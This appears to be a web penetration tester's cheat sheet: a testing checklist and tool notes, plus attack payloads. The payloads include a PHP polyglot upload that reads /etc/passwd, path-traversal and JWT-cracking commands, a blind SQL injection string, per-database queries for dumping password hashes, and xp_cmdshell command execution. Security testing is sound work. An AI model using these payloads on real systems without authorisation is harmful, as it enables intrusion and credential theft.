----

###### <font style="color:#00b3ff">Methodology</font> 

```
-start a new Burp project
-burp scan
-nikto
-wafw00f
-wpscan (if wordpress)

(-sslcan / ssl labs / testssl.sh)
-dirbuster (or dirb)
-gobuster
-burp intruder (github list bruteforce) (with authentication cookie)
-sqlmap
-check js client code
		
-test manually the app:
	- session timeout
	- session invalidation on logout
	- concurrent session
	- username enumeration
	- account lockout
	- password complexity
	- headers, CSP
	- cookie/jwt storage
	- cookie flags
	- JWT security
	- autocomplete on forms
	- CSRF
	- Cache control
	- File Upload and Download
	- Data input validation
	- Error verbosity
	- Burp browser DOM invader
	- session fixation, randomness, protocols (HTTP?)
	- authentication, 2fa, password change, remember me, SSO
	- business logic flaws
	- websockets
	- privilege escalations
```


###### <font style="color:#00b3ff">File Upload</font> 

```
- create polyglot file:
	-> exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" img-background1.jpg -o polyglot.php
```

###### <font style="color:#00b3ff">Content Security Policy</font> 

```
- Check CSP: https://csp-evaluator.withgoogle.com/
```

###### <font style="color:#00b3ff">XSS</font> 

```
- Check jQuery version in the console: console.log(jQuery().jquery);
```

###### <font style="color:#00b3ff">WebDAV</font> 

```
-> make request with OPTIONS header in Burp
	-> if the response gives a lot of methods there is probably WebDAV enabled
-> use: cadaver (a WebDAV client on Kali Linux)
	-> cadaver http://xxxxx.com
-> use: davtest
```

###### <font style="color:#00b3ff">HTTP Verb to test</font> 

```
COPY, DELETE, GET, HEAD, LOCK, MOVE, OPTIONS, POST, PROPFIND, PROPPATCH, PUT, REPORT, UNLOCK, TRACE
```

###### <font style="color:#00b3ff">Additional Techniques</font> 

```
- Change user agent in dirbuster
- create a brute-force list with the crunch tool
```

###### <font style="color:#00b3ff">dotdotpwn</font> 

```
-> testing the path traversal
-> dotdotpwn.pl -m http -h 192.168.1.1 -M GET
```

###### <font style="color:#00b3ff">tplmap.py</font> 

```
-> testing the Server Side template injection
```

###### <font style="color:#00b3ff">Xampp</font> 

```
-> folder and webpages are accessible in the folder htdocs/
```

###### <font style="color:#00b3ff">Waf Bypass</font> 

```
-> use censys.io to retrieve original ip from a website
```

###### <font style="color:#00b3ff">Burp Suite</font> 

```
-> Extensions: Additional CSRF Checks, Bypass WAF, Heartbleed, JSON Beautifier, JSON Web Tokens, JOSEPH, Kerberos Authentication, psychoPATH, SAML Raider Certificates, Wsdler, Session Auth, AWS Security Checks, Auto-Repeater, Authorize

-> Update CRSF tokens with Macros: https://portswigger.net/support/using-burp-suites-session-handling-rules-with-anti-csrf-tokens

-> Match/replace rule:
	- to replace {base} add filter to \{base}
```

###### <font style="color:#00b3ff">jwtcat.py</font> 

```
-> Crack a jwt token:
	-> python3 jwtcat.py -t [1st_part_token].[2nd_part_token] -w /usr/share/wordlists/rockyou.txt
```

###### <font style="color:#00b3ff">SQL Injections</font> 

```
[*] MySQL

	DB version	->	SELECT @@version;
	Hostname and IP	->	SELECT @@hostname;
	Current DB	->	SELECT database();
	List DBs	->	SELECT distinct(db) FROM mysql.db;
	Current user	->	SELECT user();
	List users	->	SELECT user FROM mysql.user;
	List password hashes	->	SELECT host,user,password FROM mysql.user;

	blind sqli get first number of version:
		-> S0000001I' AND IF(MID(@@version,1,1)='5',sleep(1),1); #

	List all columns and tables:
		-> SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA !='mysql' AND TABLE_SCHEMA !='information_schema' AND TABLE_SCHEMA !='performance_schema' AND TABLE_SCHEMA !='sys';

	To get command execution:
		-> we need to have write permission for MySQL

	mysql shell:
		-> select load_file('/etc/passwd');

	Comments 	-> 	#


	[*] MS-SQL

	DB version 	->	SELECT @@version
	Detailed version info	->		EXEC xp_msver
	Run OS Command		->		EXEC master..xp_cmdshell 'net user'
	Hostname and IP		->		SELECT HOST_NAME()
	Current DB		->		SELECT DB_NAME()
	List DBs	->		SELECT name FROM master..sysdatabases;
	Current User	->	SELECT user_name()
	List users	->	SELECT name FROM master..syslogins
	List tables		->	SELECT name FROM master..sysobjects WHERE xtype='U';
	List columns	->	SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='mytable');

	Comments 	-> 		--


	[*] PostgreSQL

	DB version	->	SELECT version();
	Hostname and IP	->	SELECT inet_server_addr()
	Current DB	->	SELECT current_database();
	List DBs		->	SELECT datname FROM pg_database;
	Current user	->	SELECT user;
	List users		->	SELECT username FROM pg_user;
	List password hashes	->	SELECT username,passwd FROM pg_shadow

	Comments 	-> 		--


	[*] ORACLE

	DB version	->	SELECT * FROM v$version;
	DB version	->	SELECT version FROM v$instance;
	Current DB	->	SELECT instance_name FROM v$instance;
	Current DB	->	SELECT name FROM v$database;
	List DBs	->	SELECT DISTINCT owner FROM all_tables;
	Current user	->	SELECT user FROM dual;
	List users	->	SELECT username FROM all_users ORDER BY username;
	List columns	->	SELECT column_name FROM all_tab_columns;
	List tables		->	SELECT table_name FROM all_tables;
	List password hashes	->	SELECT name, password, astatus FROM sys.user$;

	Comments 	-> 		--
```


#### Gobuster

```
gobuster dir -u https://test.test/ \

  -w SecLists/Discovery/Web-Content/common.txt \

  -t 1 \

  --delay 2s \

  --timeout 30s \

  -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

```